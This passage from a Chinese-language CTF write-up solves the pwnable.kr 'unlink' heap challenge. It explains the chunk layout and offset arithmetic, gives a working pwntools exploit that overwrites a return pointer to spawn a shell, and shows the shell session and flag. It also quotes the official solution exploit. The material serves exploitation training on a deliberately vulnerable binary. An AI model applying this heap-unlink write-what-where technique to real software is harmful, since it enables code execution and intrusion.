|           :00000000(&quot;AAAA&quot;)
|--------------------
|B-&gt;prevSize:00000000(&quot;AAAA&quot;)
|B-&gt;Size    :00000000(&quot;AAAA&quot;)
|--------------------
|B-&gt;FD      :00000000(A + 0x0C)
|B-&gt;BK      :00000000(&amp;A + 0x10)
|B-&gt;buf     :00000000
|           :00000000
|--------------------
|C-&gt;prevSize:00000000
|C-&gt;Size    :00000000
|C-&gt;fd      :00000000
|C-&gt;bk      :00000000
|--------------------
|C-&gt;FD      :00000000
|C-&gt;BK      :00000000
|C-&gt;buf     :00000000
|           :00000000
--------------------
</code></pre><p>大概的计算过程是这样的：首先我们有一个写的过程，以数字来表示填充的位置</p>
<pre><code>|A-&gt;buf     :00000000(1)
|           :00000000(2)
|--------------------
|B-&gt;prevSize:00000000(3)
|B-&gt;Size    :00000000(4)
|--------------------
|B-&gt;FD      :00000000(5)
|B-&gt;BK      :00000000(6)
</code></pre><p>填充的代码，也就是说5的数据要写进6偏移8的位置</p>
<pre><code>BK-&gt;fd=FD;
</code></pre><p>因为我们最原始的地址是<code>ebp - 0x04</code>，这个地址的值会写进ecx，所以我们要往这个位置写数据，这个地址我们通过存储A的地址来计算，<code>&amp;A</code>的值是<code>ebp - 0x14</code>，那么，我们可以通过获取输出的<code>&amp;A</code>的值，使用<code>&amp;A + 0x10</code>来指向<code>ebp - 0x04</code>，此时指向的就是数据区，不需要加上头部的偏移</p>
<p>然后是写进的数据该如何计算，前面说我们要写存储那个调用<code>system</code>函数的地址，因为有一个取地址值的过程，所以原先是<code>A + 0x08</code>，因为最后会是<code>[ecx - 0x04]</code>，所以变成了<code>A + 0x0c</code>，这样最后就会变成<code>[A + 0x0c - 0x04] -&gt; [A + 0x08]</code>，就可以取到我们输入的值了，我们输入的那个位置写入前面说的调用<code>system</code>的函数地址</p>
<p>所以来构造一下Exp</p>
<pre><code># coding = utf-8

import pwn

def main():
        mssh = pwn.ssh(host=&#39;pwnable.kr&#39;, user=&#39;unlink&#39;, password=&#39;guest&#39;, port=2222)
        attack = mssh.process(&#39;./unlink&#39;)
        attack.recvuntil(&quot;: &quot;)
        addr_A = int(attack.recvline(), 16)
        attack.recvuntil(&quot;: &quot;)
        A = int(attack.recvline(), 16)
        print hex(A), hex(addr_A)
        payload = pwn.p32(0x080484eb)
        payload += &#39;A&#39; * 12
        payload += pwn.p32(A + 0x0c)
        payload += pwn.p32(addr_A + 0x10)
        attack.send(payload)
        attack.interactive()

if __name__ == &#39;__main__&#39;:
        main()
</code></pre><p>跑起来</p>
<pre><code>wnagzihxain@tot0c ~&gt; python Exp.py 
[+] Connecting to pwnable.kr on port 2222: Done
[!] Couldn&#39;t check security settings on &#39;pwnable.kr&#39;
[+] Starting remote process &#39;./unlink&#39; on pwnable.kr: pid 58700
0x993e410 0xffbdb414
[*] Switching to interactive mode
now that you have leaks, get shell!
$ ls
$ $ whoami
unlink
$ $ ls -l
total 20
-r--r----- 1 root unlink_pwn   49 Nov 23  2016 flag
-rw-r----- 1 root unlink_pwn  543 Nov 28  2016 intended_solution.txt
-r-xr-sr-x 1 root unlink_pwn 7540 Nov 23  2016 unlink
-rw-r--r-- 1 root root        749 Nov 23  2016 unlink.c
$ $ cat flag
conditional_write_what_where_from_unl1nk_explo1t
</code></pre><p>我们看一下官方的Exp</p>
<pre><code>$ $ cat intended_solution.txt
from pwn import *
context.arch = &#39;i386&#39;    # i386 / arm
r = process([&#39;/home/unlink/unlink&#39;])
leak = r.recvuntil(&#39;shell!\n&#39;)
stack = int(leak.split(&#39;leak: 0x&#39;)[1][:8], 16)
heap = int(leak.split(&#39;leak: 0x&#39;)[2][:8], 16)
shell = 0x80484eb
payload = pack(shell)        # heap + 8  (new ret addr)
payload += pack(heap + 12)    # heap + 12 (this -4 becomes ESP at ret)
payload += &#39;3333&#39;        # heap + 16
payload += &#39;4444&#39;
payload += pack(stack - 0x20)    # eax. (address of old ebp of unlink) -4
payload += pack(heap + 16)    # edx.
r.sendline( payload )
r.interactive()
</code></pre><p>Flag</p>
<pre><code>conditional_write_what_where_from_unl1nk_explo1t
</code></pre><p>另外，我在学习unlink利用的时候，阅读过很多大牛们的文章，已在最下面列出，同时也是学习堆溢出利用极好的文章，大家可以参考，至于我写的，拾人牙慧耳</p>
<h2 id="references">References</h2>
<ul>
<li><a href="http://jaq.alibaba.com/community/art/show?articleid=315">走位@阿里聚安全-Linux堆内存管理深入分析(上半部)</a></li><li><a href="https://jaq.alibaba.com/community/art/show?articleid=334">走位@阿里聚安全-Linux堆内存管理深入分析(下半部)</a></li><li><a href="https://jaq.alibaba.com/community/art/show?articleid=360">走位@阿里聚安全-Linux堆溢出漏洞利用之unlink</a></li><li><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">sploitfun-Understanding glibc malloc</a></li><li><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">sploitfun-Syscalls used by malloc.</a></li></ul>

</body>
</html>
<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
